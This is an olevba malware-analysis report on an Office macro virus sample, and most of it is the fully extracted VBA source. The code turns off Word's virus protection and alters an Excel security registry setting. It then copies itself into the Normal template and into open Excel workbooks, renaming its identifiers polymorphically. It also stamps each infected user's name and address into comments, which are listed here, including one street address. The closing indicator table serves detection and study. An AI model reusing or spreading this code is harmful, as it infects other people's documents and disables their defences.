olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.o-ded66441fd3634e23d9bfaf944a6c859b7df5944
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.o-ded66441fd3634e23d9bfaf944a6c859b7df5944 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































Private Sub Workbook_Deactivate()
On Error Resume Next
Const XKBSHVGYMQQPIC = 1, INJMFGFXIAXHZ = True, LYNBHTCKCFL = False, OMASQWETEHZ = 0
Dim VMDCKLDROSJ, ESHIT As String
Dim POIZGFN, QXEBR As Integer
Dim PPKHSLYCN As Boolean
ESHIT = "ThisWorkbook"
VMDCKLDROSJ = Application.ThisWorkbook.VBProject.VBComponents.Item(XKBSHVGYMQQPIC).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(XKBSHVGYMQQPIC).CodeModule.CountOfLines)
Call KMYIAWITGZYIPA(VMDCKLDROSJ)
For POIZGFN = XKBSHVGYMQQPIC To Application.Workbooks.Count
PPKHSLYCN = LYNBHTCKCFL
For QXEBR = XKBSHVGYMQQPIC To Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Count
If Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).CodeModule.CountOfLines = OMASQWETEHZ Then
If Application.Workbooks.Item(POIZGFN).Path <> "" And Application.Workbooks.Item(POIZGFN).Saved = INJMFGFXIAXHZ And PPKHSLYCN = LYNBHTCKCFL Then PPKHSLYCN = INJMFGFXIAXHZ
Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).CodeModule.InsertLines XKBSHVGYMQQPIC, VMDCKLDROSJ
If Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).Name = ESHIT Then
Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).CodeModule.ReplaceLine XKBSHVGYMQQPIC * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).CodeModule.ReplaceLine XKBSHVGYMQQPIC * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next QXEBR
If PPKHSLYCN = INJMFGFXIAXHZ Then Application.Workbooks.Item(POIZGFN).Save
Next POIZGFN
End Sub
Private Sub Document_Close()
Const INJMFGFXIAXHZ = True, LYNBHTCKCFL = False, OMASQWETEHZ = 0, XKBSHVGYMQQPIC = 1, KJUYYLO = wdFormatDocument, CBXVFKAEKMCBM = wdFormatTemplate, SFHYGPHRHFKQOZQ = ":"
Dim PPKHSLYCN, WRQZYPXLVGFQY, IKPKZPAKGWBBJTX, KBZJOHNI As Boolean
Dim SQCSDOXDP, FOOVZJA As Object
Dim RPZRXFMOI, VMDCKLDROSJ As String
Set SQCSDOXDP = ActiveDocument.VBProject.VBComponents.Item(XKBSHVGYMQQPIC)
Set FOOVZJA = NormalTemplate.VBProject.VBComponents.Item(XKBSHVGYMQQPIC)
Randomize
IKPKZPAKGWBBJTX = LYNBHTCKCFL
KBZJOHNI = LYNBHTCKCFL
If SQCSDOXDP.CodeModule.CountOfLines <> OMASQWETEHZ Then IKPKZPAKGWBBJTX = INJMFGFXIAXHZ
If FOOVZJA.CodeModule.CountOfLines <> OMASQWETEHZ Then KBZJOHNI = INJMFGFXIAXHZ
Options.VirusProtection = LYNBHTCKCFL
If (IKPKZPAKGWBBJTX = INJMFGFXIAXHZ Xor KBZJOHNI = INJMFGFXIAXHZ) And (ActiveDocument.SaveFormat = KJUYYLO Or ActiveDocument.SaveFormat = CBXVFKAEKMCBM) Then
If IKPKZPAKGWBBJTX = INJMFGFXIAXHZ Then
WRQZYPXLVGFQY = NormalTemplate.Saved
VMDCKLDROSJ = SQCSDOXDP.CodeModule.Lines(XKBSHVGYMQQPIC, SQCSDOXDP.CodeModule.CountOfLines)
Call FAMZKCGP(VMDCKLDROSJ)
If Int(Rnd * 10 * XKBSHVGYMQQPIC) = XKBSHVGYMQQPIC * 7 Then Call ZPOTPQB(VMDCKLDROSJ)
Call JEPMGVVHOYOGM(VMDCKLDROSJ)
FOOVZJA.CodeModule.InsertLines XKBSHVGYMQQPIC, VMDCKLDROSJ
If WRQZYPXLVGFQY = INJMFGFXIAXHZ Then NormalTemplate.Save
End If
RPZRXFMOI = Mid(ActiveDocument.FullName, 2, XKBSHVGYMQQPIC)
If KBZJOHNI = INJMFGFXIAXHZ And (RPZRXFMOI = SFHYGPHRHFKQOZQ Or ActiveDocument.Saved = LYNBHTCKCFL) Then
PPKHSLYCN = ActiveDocument.Saved
VMDCKLDROSJ = FOOVZJA.CodeModule.Lines(XKBSHVGYMQQPIC, FOOVZJA.CodeModule.CountOfLines)
Call JEPMGVVHOYOGM(VMDCKLDROSJ)
SQCSDOXDP.CodeModule.InsertLines XKBSHVGYMQQPIC, VMDCKLDROSJ
If PPKHSLYCN = INJMFGFXIAXHZ Then ActiveDocument.Save
End If
End If
End Sub
Private Sub ZPOTPQB(ByRef VMDCKLDROSJ As String)
On Error Resume Next
Const MLTHQEN = 48, FRVEIKQVDPK = 15, ZOGIBBVMHPWTQ = 5, CUMDGILXHZB = 65, HQKTZXCK = 90, XKBSHVGYMQQPIC = 1, INJMFGFXIAXHZ = True, LYNBHTCKCFL = False
Dim HPGPSFXHANTY, UHUEJIQABBGXTmp, HFDKXCLWOEKVOC, UHUEJIQABBGX(XKBSHVGYMQQPIC To MLTHQEN), UHUEJIQABBGX2(XKBSHVGYMQQPIC To MLTHQEN) As String
Dim POIZGFN, QXEBR, SGXONQLCPQZC As Integer
Dim CCPIIV As Boolean
HPGPSFXHANTY = "VMDCKLDROSJ MLTHQEN UHUEJIQABBGX UHUEJIQABBGX2 HFDKXCLWOEKVOC POIZGFN QXEBR SGXONQLCPQZC CCPIIV ZPOTPQB FRVEIKQVDPK ZOGIBBVMHPWTQ CUMDGILXHZB HQKTZXCK XKBSHVGYMQQPIC HPGPSFXHANTY UHUEJIQABBGXTmp PPKHSLYCN WRQZYPXLVGFQY IKPKZPAKGWBBJTX KBZJOHNI SQCSDOXDP FOOVZJA FAMZKCGP KDSJHDCIHPNYD VGTCCPRRFS STSIBTYLRCCHMF HELJBVMLSLGPBO KDSJHDCIHPNYDTmp HZOXZWR FESVRYKFHBJMJ RPZRXFMOI INJMFGFXIAXHZ LYNBHTCKCFL OMASQWETEHZ KJUYYLO CBXVFKAEKMCBM XDHENU PNEQXHBUONCVHCK SFHYGPHRHFKQOZQ SYUJIMJGXA YLUUOYWGEFQEYJE ESHIT KMYIAWITGZYIPA JEPMGVVHOYOGM WRKBW UORXKHRFRFDPH WGBWGOF"
Randomize
QXEBR = XKBSHVGYMQQPIC
For POIZGFN = XKBSHVGYMQQPIC To Len(HPGPSFXHANTY)
If Mid(HPGPSFXHANTY, POIZGFN, XKBSHVGYMQQPIC) = " " Or POIZGFN = Len(HPGPSFXHANTY) Then
If POIZGFN = Len(HPGPSFXHANTY) Then UHUEJIQABBGXTmp = UHUEJIQABBGXTmp & Mid(HPGPSFXHANTY, POIZGFN, XKBSHVGYMQQPIC)
For SGXONQLCPQZC = XKBSHVGYMQQPIC To Int((FRVEIKQVDPK - ZOGIBBVMHPWTQ + XKBSHVGYMQQPIC) * Rnd + ZOGIBBVMHPWTQ)
UHUEJIQABBGX2(QXEBR) = UHUEJIQABBGX2(QXEBR) & Chr(Int((HQKTZXCK - CUMDGILXHZB + XKBSHVGYMQQPIC) * Rnd + CUMDGILXHZB))
Next SGXONQLCPQZC
UHUEJIQABBGX(QXEBR) = UHUEJIQABBGXTmp
UHUEJIQABBGXTmp = ""
QXEBR = QXEBR + XKBSHVGYMQQPIC
Else
UHUEJIQABBGXTmp = UHUEJIQABBGXTmp & Mid(HPGPSFXHANTY, POIZGFN, XKBSHVGYMQQPIC)
End If
Next POIZGFN
CCPIIV = LYNBHTCKCFL
For POIZGFN = XKBSHVGYMQQPIC To Len(VMDCKLDROSJ)
For QXEBR = XKBSHVGYMQQPIC To MLTHQEN
If Mid(VMDCKLDROSJ, POIZGFN, Len(UHUEJIQABBGX(QXEBR))) = UHUEJIQABBGX(QXEBR) Then
HFDKXCLWOEKVOC = HFDKXCLWOEKVOC & UHUEJIQABBGX2(QXEBR)
POIZGFN = POIZGFN + Len(UHUEJIQABBGX(QXEBR)) - XKBSHVGYMQQPIC
CCPIIV = INJMFGFXIAXHZ
Exit For
End If
Next QXEBR
If CCPIIV = LYNBHTCKCFL Then
HFDKXCLWOEKVOC = HFDKXCLWOEKVOC & Mid(VMDCKLDROSJ, POIZGFN, XKBSHVGYMQQPIC)
Else
CCPIIV = LYNBHTCKCFL
End If
Next POIZGFN
VMDCKLDROSJ = HFDKXCLWOEKVOC
End Sub
Private Sub FAMZKCGP(ByRef VMDCKLDROSJ As String)
On Error Resume Next
Const HELJBVMLSLGPBO = "' ", XKBSHVGYMQQPIC = 1
Const XDHENU = "hh:mm:ss: AMPM - ", PNEQXHBUONCVHCK = "dddd, d mmm yyyy"
Dim KDSJHDCIHPNYDTmp, KDSJHDCIHPNYD, HZOXZWR, FESVRYKFHBJMJ, VGTCCPRRFS, STSIBTYLRCCHMF As String
Dim POIZGFN As Integer
VGTCCPRRFS = Chr(10 * XKBSHVGYMQQPIC + 3)
KDSJHDCIHPNYD = Application.UserAddress
FESVRYKFHBJMJ = Format(Time, XDHENU) & Format(Date, PNEQXHBUONCVHCK)
STSIBTYLRCCHMF = Chr(XKBSHVGYMQQPIC * 10)
HZOXZWR = Application.UserName
For POIZGFN = XKBSHVGYMQQPIC To Len(KDSJHDCIHPNYD)
If Mid(KDSJHDCIHPNYD, POIZGFN, XKBSHVGYMQQPIC) <> VGTCCPRRFS Then
If Mid(KDSJHDCIHPNYD, POIZGFN, XKBSHVGYMQQPIC) <> STSIBTYLRCCHMF Then
KDSJHDCIHPNYDTmp = KDSJHDCIHPNYDTmp & Mid(KDSJHDCIHPNYD, POIZGFN, XKBSHVGYMQQPIC)
End If
Else
KDSJHDCIHPNYDTmp = KDSJHDCIHPNYDTmp & VGTCCPRRFS & HELJBVMLSLGPBO
End If
Next POIZGFN
VMDCKLDROSJ = VMDCKLDROSJ & VGTCCPRRFS & HELJBVMLSLGPBO & FESVRYKFHBJMJ & VGTCCPRRFS & HELJBVMLSLGPBO & HZOXZWR & VGTCCPRRFS & HELJBVMLSLGPBO & KDSJHDCIHPNYD & VGTCCPRRFS
End Sub
Private Sub JEPMGVVHOYOGM(ByVal VMDCKLDROSJ As String)
On Error Resume Next
Dim WGBWGOF As Long
Dim SYUJIMJGXA As Object
Dim WRKBW, UORXKHRFRFDPH As String
WRKBW = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
WGBWGOF = &H0
UORXKHRFRFDPH = "Options6"
System.PrivateProfileString("", WRKBW, UORXKHRFRFDPH) = WGBWGOF
Set SYUJIMJGXA = GetObject(, "Excel.Application")
Const XKBSHVGYMQQPIC = 1, OMASQWETEHZ = 0
Dim ESHIT As String
Dim POIZGFN, QXEBR As Integer
ESHIT = "ThisWorkbook"
For POIZGFN = XKBSHVGYMQQPIC To SYUJIMJGXA.Application.Workbooks.Count
For QXEBR = XKBSHVGYMQQPIC To SYUJIMJGXA.Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Count
If SYUJIMJGXA.Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).CodeModule.CountOfLines = OMASQWETEHZ Then
SYUJIMJGXA.Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).CodeModule.InsertLines XKBSHVGYMQQPIC, VMDCKLDROSJ
If SYUJIMJGXA.Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).Name = ESHIT Then
SYUJIMJGXA.Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).CodeModule.ReplaceLine 33 * XKBSHVGYMQQPIC, "Private Sub Workbook_Deactivate()"
Else
SYUJIMJGXA.Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).CodeModule.ReplaceLine XKBSHVGYMQQPIC * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next QXEBR
Next POIZGFN
Set SYUJIMJGXA = Nothing
End Sub
Private Sub KMYIAWITGZYIPA(ByVal VMDCKLDROSJ As String)
On Error Resume Next
Const INJMFGFXIAXHZ = True, LYNBHTCKCFL = False, XKBSHVGYMQQPIC = 1, OMASQWETEHZ = 0
Dim YLUUOYWGEFQEYJE As Object
Dim WRQZYPXLVGFQY As Boolean
Set YLUUOYWGEFQEYJE = GetObject(, "Word.Application")
If YLUUOYWGEFQEYJE.NormalTemplate.VBProject.VBComponents.Item(XKBSHVGYMQQPIC).CodeModule.CountOfLines = OMASQWETEHZ Then
WRQZYPXLVGFQY = YLUUOYWGEFQEYJE.NormalTemplate.Saved
YLUUOYWGEFQEYJE.Options.VirusProtection = LYNBHTCKCFL
YLUUOYWGEFQEYJE.NormalTemplate.VBProject.VBComponents.Item(XKBSHVGYMQQPIC).CodeModule.InsertLines XKBSHVGYMQQPIC, VMDCKLDROSJ
If WRQZYPXLVGFQY = INJMFGFXIAXHZ Then YLUUOYWGEFQEYJE.NormalTemplate.Save
End If
Set YLUUOYWGEFQEYJE = Nothing
End Sub

' 09:50:09: AM - Wednesday, 10 Feb 1999
' Al Peabody
' 1634 Orchard Beach Road
Annapolis, MD 21401

' 09:42:15: AM - Monday, 22 Feb 1999
' Sergey Morozov
'

' 09:49:26: AM - ÷ĺňâĺđă, 11 ěŕđ 1999
' Advisor
'

' 04:16:54:  - ďîíĺäĺëüíčę, 22 ěŕđ 1999
' ***
'

' 11:52:11:  - ÷ĺňâĺđă, 15 ŕďđ 1999
' Freddy Kruger
'

' 10:39:12:  - ÷ĺňâĺđă, 20 ěŕé 1999
' Andy
'

' 02:41:47:  - ńđĺäŕ, 26 ěŕé 1999
' Andy
'

' 10:00:09:  - ďîíĺäĺëüíčę, 31 ěŕé 1999
' Andy
'

' 03:33:09:  - ďîíĺäĺëüíčę, 1 ˙íâ 1996
' Laborant
'

' 01:48:28:  - ńđĺäŕ, 2 čţí 1999
' User4
'

' 03:44:53:  - ÷ĺňâĺđă, 11 čţí 1998
' ĘÎÄ
'

' 09:41:05:  - ÷ĺňâĺđă, 13 čţí 1996
' Řňŕíüęî
'

' 03:24:12:  - âňîđíčę, 15 čţí 1999
' Ďîďîâ Ä.Ŕ.
'

' 04:33:12:  - âňîđíčę, 15 čţí 1999
' Ďîďîâ Ä. Ŕ.
'

' 12:29:49:  - ńđĺäŕ, 30 čţí 1999
' Ďîďîâ Ä.Ŕ.
'

' 03:42:00:  - âîńęđĺńĺíüĺ, 12 ńĺí 1999
' -UFO-
'

' 03:27:12:  - âîńęđĺńĺíüĺ, 5 äĺę 1999
' Îëĺă
'

' 01:47:48:  - âîńęđĺńĺíüĺ, 12 äĺę 1999
' Îáúĺäęîâ Îëĺă Ŕëĺęńŕíäđîâč÷
'

' 09:22:00:  - ńđĺäŕ, 12 ˙íâ 2000
' Îáúĺäęîâ Îëĺă Ŕëĺęńŕíäđîâč÷
'

' 11:25:35:  - âîńęđĺńĺíüĺ, 27 ěŕé 2001
' Îáúĺäęîâ Îëĺă Ŕëĺęńŕíäđîâč÷
'

Private Sub Document_New()

End Sub

Private Sub Document_Open()

End Sub
' 08:15:17:  - ďîíĺäĺëüíčę, 10 ńĺí 2001
' Ěóőŕěĺäü˙đîâ Ěŕđŕň Đŕâčëüĺâč÷
'

' 02:41:49:  - âňîđíčę, 25 ńĺí 2001
' Ŕëëŕ
'

' 05:11:18:  - ď˙ňíčöŕ, 26 îęň 2001
' Ŕëëŕ
'

' 11:08:41:  - âîńęđĺńĺíüĺ, 23 äĺę 2001
' Ďóäîâŕ Ĺ.Â.
'

' 12:00:08:  - âňîđíčę, 16 ŕďđ 2002
' Řęóíîâ
'

' 09:41:05:  - âňîđíčę, 22 ŕďđ 1997
' 1
'

' 01:59:49:  - âňîđíčę, 23 Ŕďđ 2002
' Patient Of Dr.OGen
'

' 09:56:47:  - âňîđíčę, 7 ěŕé 2002
' Äŕâë˙ňîâ Čëüäóń
'

' 10:14:44:  - ďîíĺäĺëüíčę, 3 čţí 2002
' Äŕâë˙ňîâ Čëüäóń
'

' 02:49:01:  - âňîđíčę, 11 čţí 2002
' Ŕäěčíčńňđŕňîđ
'

' 10:36:55:  - ď˙ňíčöŕ, 5 čţë 2002
' 1
'

' 06:19:01:  - ď˙ňíčöŕ, 5 čţë 2002
' Ŕäěčíčńňđŕňîđ
'

' 05:08:26:  - ńđĺäŕ, 24 čţë 2002
' Ŕäěčíčńňđŕňîđ
'

' 09:32:12:  - ńđĺäŕ, 31 čţë 2002
' Ŕäěčíčńňđŕňîđ
'

' 05:12:55:  - ńđĺäŕ, 31 čţë 2002
' RAFIKOV
'

' 08:59:32:  - âňîđíčę, 5 íî˙ 2002
' RAFIKOV
'

' 11:25:16:  - ńđĺäŕ, 27 íî˙ 2002
' Ňîęŕđĺâ
'

' 11:49:42:  - âňîđíčę, 3 äĺę 2002
' MBT
'

' 01:56:51:  - ńóááîňŕ, 4 ˙íâ 2003
' User
'

' 11:26:03:  - ÷ĺňâĺđă, 9 ˙íâ 2003
' fayer
' aku@tanak-cakap.com

' 09:52:19:  - utorok, 18 III 2003
' Rep1
'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Andy                |May detect Anubis Sandbox                    |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

